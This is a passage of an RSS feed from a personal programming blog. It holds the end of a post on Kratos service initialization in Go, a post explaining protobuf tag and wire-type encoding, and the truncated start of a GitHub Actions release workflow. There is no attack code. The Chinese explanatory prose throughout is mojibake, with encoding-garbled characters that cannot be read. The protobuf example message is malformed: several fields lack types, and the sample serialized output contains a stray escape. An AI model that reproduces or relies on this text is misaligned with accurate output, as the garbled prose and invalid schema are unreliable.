&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å“‡ï¼ŒåŸæ¥åªæ˜¯æŠŠä¸€äº›gRPCçš„æœåŠ¡ç»‘å®šåˆ°&lt;code&gt;gin&lt;/code&gt;çš„è·¯ç”±é‡Œäº†å‘€ã€‚
å€Ÿç”¨&lt;code&gt;gin&lt;/code&gt;æ¥è°ƒç”¨gRPC.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;grpc.New()&lt;/code&gt;å°±ä¸åˆ†æäº†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åæ˜¯&lt;code&gt;AppNew()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//go:generate kratos tool wire
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;App&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;svc&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Engine&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;grpc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;warden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Server&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;NewApp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;h&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;warden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;App&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;closeFunc&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;App&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;svc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;svc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;grpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// ä¸€ä¸ªå…³é—­contextçš„å›è°ƒ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;closeFunc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cancel&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;WithTimeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;35&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Second&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Shutdown&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
			&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;grpcSrv.Shutdown error(%v)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Shutdown&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
			&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;httpSrv.Shutdown error(%v)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
		&lt;span class=&#34;nf&#34;&gt;cancel&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆ°è¿™é‡Œåˆå§‹åŒ–æ˜¯ç»“æŸäº†ã€‚&lt;/p&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;kratos&lt;/code&gt;çš„åˆå§‹åŒ–æµç¨‹:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è¯»å–é…ç½®æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;å®ä¾‹åŒ–Daoå±‚&lt;/li&gt;
&lt;li&gt;å®ä¾‹åŒ–gRPCæœåŠ¡&lt;/li&gt;
&lt;li&gt;å®ä¾‹åŒ–ginçš„engine&lt;/li&gt;
&lt;li&gt;æ³¨å†ŒgPRCåˆ°engine&lt;/li&gt;
&lt;li&gt;å¯åŠ¨engine&lt;/li&gt;
&lt;li&gt;å¯åŠ¨gRPCæœåŠ¡ç«¯&lt;/li&gt;
&lt;li&gt;è·å¾—æ•´ä¸ªç¨‹åºå…³é—­çš„å›è°ƒ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘åˆ†å¾—åº”è¯¥è¿˜æ˜¯æ¯”è¾ƒç»†çš„ã€‚&lt;/p&gt;
&lt;p&gt;åé¢åº”è¯¥è¿˜ä¼šåˆ†æ&lt;code&gt;warden&lt;/code&gt;ï¼Œå®ƒæ˜¯&lt;code&gt;Kratos&lt;/code&gt;åœ¨&lt;code&gt;grpc&lt;/code&gt;åŸç‰ˆä¸Šçš„ä¸€ä¸ªå°è£…ç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;æºœäº†æºœäº†&amp;hellip;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Protubuf åŸç†</title>
        <link>https://sdttttt.github.io/p/protubuf-%E5%8E%9F%E7%90%86/</link>
        <pubDate>Mon, 30 Mar 2020 03:05:12 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/protubuf-%E5%8E%9F%E7%90%86/</guid>
        <description>&lt;p&gt;protobufçš„messageä¸­æœ‰å¾ˆå¤šå­—æ®µ,æ¯ä¸ªå­—æ®µçš„æ ¼å¼ä¸º:
ä¿®é¥°ç¬¦ å­—æ®µç±»å‹ å­—æ®µå = åŸŸå·;
åœ¨åºåˆ—åŒ–æ—¶,protobufæŒ‰ç…§TLVçš„æ ¼å¼åºåˆ—åŒ–æ¯ä¸€ä¸ªå­—æ®µ,Tå³Tag,ä¹Ÿå«Key;Væ˜¯è¯¥å­—æ®µå¯¹åº”çš„å€¼v
çœç•¥ã€‚
åºåˆ—åŒ–åçš„Valueæ˜¯æŒ‰åŸæ ·ä¿å­˜åˆ°å­—ç¬¦ä¸²æˆ–è€…æ–‡ä»¶ä¸­,KeyæŒ‰ç…§ä¸€å®šçš„è½¬æ¢æ¡ä»¶ä¿å­˜èµ·æ¥,åºåˆ—åŒ–åçš„
messageä¸­å­—æ®µåé¢çš„åŸŸå·ä¸å­—æ®µç±»å‹æ¥è½¬æ¢ã€‚è½¬æ¢å…¬å¼å¦‚ä¸‹:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(field_number &amp;laquo; 3) | wire_type&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;wire_typeä¸ç±»å‹çš„å¯¹åº”å…³ç³»è¡¨:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;wire_type&lt;/th&gt;
&lt;th&gt;meaning&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Vaint&lt;/td&gt;
&lt;td&gt;int32ã€int64ã€uint32ã€uint64ã€sint32ã€sint64ã€boolã€enum&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;64-bit&lt;/td&gt;
&lt;td&gt;fixedã€sfixed64ã€double&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;Length-delimi&lt;/td&gt;
&lt;td&gt;stringã€bytesã€embeddedã€messagesã€packed repeated fields&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;Start group&lt;/td&gt;
&lt;td&gt;Groups(deprecated)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;End group&lt;/td&gt;
&lt;td&gt;Groups(deprecated)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;32-bit&lt;/td&gt;
&lt;td&gt;fixed32ã€sfixed32ã€float&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;ã€€As you can see, each field in the message definition has a unique numbered tag. These tags are used to identify your fields in the message binary format, and should not be changed once your message type is in use. Note that tags with values in the range 1 through 15 take one byte to encode. Tags in the range 16 through 2047 take two bytes. So you should reserve the tags 1 through 15 for very frequently occurring message elements. Remember to leave some room for frequently occurring elements that might be added in the future.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¸Šé¢ä¸€æ®µè¯æ˜¯æ¥è‡ªGoogle Protobuf Documentsï¼Œä¸Šé¢æœ‰å‡ ä¸ªä¿¡æ¯éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š
protobufåè®®ä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼è¡¨ç¤ºKeyå­—æ®µï¼›å¯¹valueè€Œè¨€ï¼Œä¸åŒçš„ç±»å‹é‡‡ç”¨çš„ç¼–ç æ–¹å¼ä¹Ÿä¸åŒï¼Œå¦‚æœæ˜¯æ•´å‹ï¼Œé‡‡ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºï¼›å¦‚æœæ˜¯å­—ç¬¦ï¼Œä¼šç›´æ¥åŸæ ·å†™å…¥æ–‡ä»¶æˆ–è€…å­—ç¬¦ä¸²ï¼ˆå³ä¸ç¼–ç ï¼‰ã€‚ç”±äºåˆšå¼€å§‹æ¥è§¦protobufåè®®ï¼Œæˆ‘ä¹Ÿåœ¨å­¦ä¹ ä¸­ï¼Œä¸‹é¢æˆ‘ä¼šç»™å‡ºä¸€ä¸ªä¾‹å­ï¼Œå¯¹äºå…¶ä»–ä¸€äº›ç±»å‹çš„ç¼–ç æ–¹å¼ï¼Œå¯ä»¥ä»¿ç…§è¿™ä¸ªä¾‹å­è‡ªå·±å®éªŒä¸€ä¸‹ã€‚
&lt;strong&gt;ï¼ˆè¿™ä¸ªä¾‹å­ä¸»è¦æ˜¯è®²è¿°Keyçš„ç¼–ç æ–¹å¼ï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢è¯´è¿‡ï¼Œå¯¹äºmessageä¸­çš„æ¯ä¸€ä¸ªåŸŸï¼Œéƒ½å¯¹åº”ä¸€ä¸ªåŸŸå·ã€‚protobufè§„å®šï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚æœåŸŸå·åœ¨[1ï¼Œ15]èŒƒå›´å†…ï¼Œä¼šä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºKeyï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœåŸŸå·å¤§äºç­‰äº16ï¼Œä¼šä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºKeyï¼›&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Keyç¼–ç è¿‡åï¼Œè¯¥å­—èŠ‚çš„ç¬¬ä¸€ä¸ªæ¯”ç‰¹ä½è¡¨ç¤ºä¹‹åçš„ä¸€ä¸ªå­—èŠ‚æ˜¯å¦ä¸å½“å‰è¿™ä¸ªå­—èŠ‚æœ‰å…³:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚æœç¬¬ä¸€ä¸ªæ¯”ç‰¹ä½ä¸º1ï¼Œè¡¨ç¤ºæœ‰å…³ï¼Œå³è¿ç»­ä¸¤ä¸ªå­—èŠ‚éƒ½æ˜¯Keyçš„ç¼–ç ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœç¬¬ä¸€ä¸ªæ¯”ç‰¹ä½ä¸º0ï¼Œè¡¨ç¤ºKeyçš„ç¼–ç åªæœ‰å½“å‰ä¸€ä¸ªå­—èŠ‚ï¼Œåé¢çš„å­—èŠ‚æ˜¯Lengthæˆ–è€…Valueï¼›&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;ç»“åˆå…¬å¼ ï¼ˆfield_number &amp;laquo; 3ï¼‰| wire_type ï¼Œå¦‚æœåŸŸå·å¤§äºç­‰äº16ï¼Œä¸¤ä¸ªå­—èŠ‚å…±16ä½ï¼Œå»æ‰ç§»ä½çš„3ä½ï¼Œå»æ‰ä¸¤ä¸ªå­—èŠ‚ä¸­ç¬¬ä¸€ä¸ªæ¯”ç‰¹ä½ï¼Œæ€»å…±16ä¸ªæ¯”ç‰¹ä½åªæœ‰16-5==11ä¸ªæ¯”ç‰¹ä½ç”¨æ¥è¡¨ç¤ºKeyï¼Œæ‰€ä»¥Keyçš„åŸŸå·è¦å°äº2^11== 2048&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;protobuf-example&#34;&gt;Protobuf Example&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-proto&#34; data-lang=&#34;proto&#34;&gt;&lt;span class=&#34;kd&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;required&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;required&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;required&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;required&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨protocç¼–è¯‘åï¼Œç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;protoc -I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;. â€“cpp_out&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;. person.proto
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å»ºç«‹ä¸€ä¸ªPersonå¯¹è±¡: å±æ€§ä¸º&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id = 111

name = China

addr = Asia

test = ttttt

# æ‰“å°å‡ºåºåˆ—åŒ–åçš„ç»“æœä¸ºï¼š

&#39;\n\003\061\061\061\022\005China\032\004\Asia\302\005ttttt&#39;

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€˜\nâ€™æ˜¯idå­—æ®µçš„Keyï¼Œåé¢çš„\003ï¼ˆå…«è¿›åˆ¶ï¼‰è¡¨ç¤ºidå­—æ®µçš„å€¼é•¿åº¦ä¸º3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;keyçš„åŸŸå·ä¸è¶…è¿‡15çš„åºåˆ—åŒ–è§£æï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å› ä¸ºidå­—æ®µçš„åŸŸå·ä¸º1ï¼Œæ˜¯å°äº15çš„ï¼Œæ‰€ä»¥idå­—æ®µçš„Keyåºåˆ—åŒ–è¦å 1ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œ00000001å·¦ç§»3ä½å˜æˆ 00001000ï¼Œå› ä¸ºstringçš„wire_typeå€¼æ˜¯2ï¼Œæ‰€ä»¥00001000å†æˆ–ä¸Š2ï¼Œå˜æˆ00001010ï¼Œå°±æ˜¯åè¿›åˆ¶çš„10ï¼Œå³å­—ç¬¦â€™\nâ€™ã€‚ä¸‹é¢çš„å­—æ®µå¦‚æœåŸŸå·ä¸è¶…è¿‡15ï¼Œè§£æåŒidå­—æ®µã€‚
åé¢è¿ç»­3ä¸ªâ€™\61â€™ï¼ˆå…«è¿›åˆ¶ï¼‰å³å­—ç¬¦â€™1â€™ï¼›
åŒæ ·\022\005æ˜¯nameå­—æ®µçš„keyå’Œvalueé•¿åº¦ï¼Œåé¢æ˜¯nameå­—æ®µçš„å€¼ï¼›
\032\004æ˜¯addrå­—æ®µçš„keyå’Œvalueé•¿åº¦ï¼›&lt;/p&gt;
&lt;p&gt;æœ€åï¼Œ\302&amp;gt;\005æ˜¯testå­—æ®µçš„Keyå’ŒValueé•¿åº¦ï¼›&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;keyçš„åŸŸå·å¤§äº15çš„åºåˆ—åŒ–è§£æï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç”±äºCSDNç¼–è¾‘å™¨ä¸æ”¯æŒCSSæ ¼å¼ï¼Œæ²¡æœ‰åŠæ³•æ ‡è®°ä¸‹é¢çš„è§£æå†…å®¹çš„é¢œè‰²ï¼Œåªæœ‰æ”¾ä¸€ä¸ªå›¾ç‰‡ä¸Šå»äº† ^_^;
ä¸‹é¢å›¾ç‰‡ä¸­çš„\76å°±æ˜¯\302åé¢çš„â€˜&amp;gt;â€™å­—ç¬¦çš„å…«è¿›åˆ¶è¡¨ç¤ºï¼Œ\302ä¸&amp;gt;å…±åŒç»„æˆæœ€åä¸€ä¸ªå­—æ®µçš„Keyçš„è¡¨ç¤ºï¼ˆå› ä¸ºæœ€åä¸€ä¸ªå­—æ®µtestçš„åŸŸå·1000å¤§äº15ï¼Œæ‰€ä»¥éœ€è¦å ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºKeyï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;../../protobuf_1.jpg&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Github Actions</title>
        <link>https://sdttttt.github.io/p/github-actions/</link>
        <pubDate>Wed, 11 Mar 2020 00:50:00 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/github-actions/</guid>
        <description>&lt;h2 id=&#34;github-actions-ä¸Šä¼ -releases&#34;&gt;Github Actions ä¸Šä¼  Releases&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# https://help.github.com/en/articles/workflow-syntax-for-github-actions#on&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;s1&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;jobs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;runs-on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ubuntu-latest&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
